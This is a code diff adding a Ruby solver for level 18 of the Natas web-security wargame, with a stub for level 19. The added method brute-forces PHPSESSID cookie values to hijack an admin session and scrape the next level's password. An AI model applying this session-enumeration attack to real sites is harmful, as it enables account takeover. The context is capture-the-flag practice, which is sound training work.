@@ -553,4 +553,33 @@ end
 # Level 18
 class NatasLevel18 < NatasLevelBase
   LEVEL = 18
+  PAGE = '/'
+  MAX_ID = 640
+
+  def exec
+    log('Bruteforcing PHPSESSID')
+    MAX_ID.times do |id|
+      data = post(
+        PAGE,
+        {
+          'Cookie' => "PHPSESSID=#{id}"
+        },
+        {
+          'username' => 'admin',
+          'password' => ''
+        }
+      ).body
+      match = %r(Password: (\w{32})</pre>).match(data)
+      next unless match
+      found(match[1])
+      break
+    end
+  end
+end
+
+
+##
+# Level 19
+class NatasLevel19 < NatasLevelBase
+  LEVEL = 19
 end
